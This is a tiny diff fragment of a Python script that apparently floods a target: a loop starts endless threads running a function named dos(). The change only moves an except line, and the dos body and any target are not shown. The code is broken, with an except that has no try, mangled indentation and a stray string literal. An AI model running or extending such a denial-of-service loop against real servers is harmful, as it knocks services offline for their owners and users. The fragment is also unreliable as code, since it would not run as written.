@@ -47,7 +47,7 @@ def dos():
   
 while True:
  threading.Thread(target=dos).start()
-except:
+  except:
             pass
 "response.text"
 # Stats
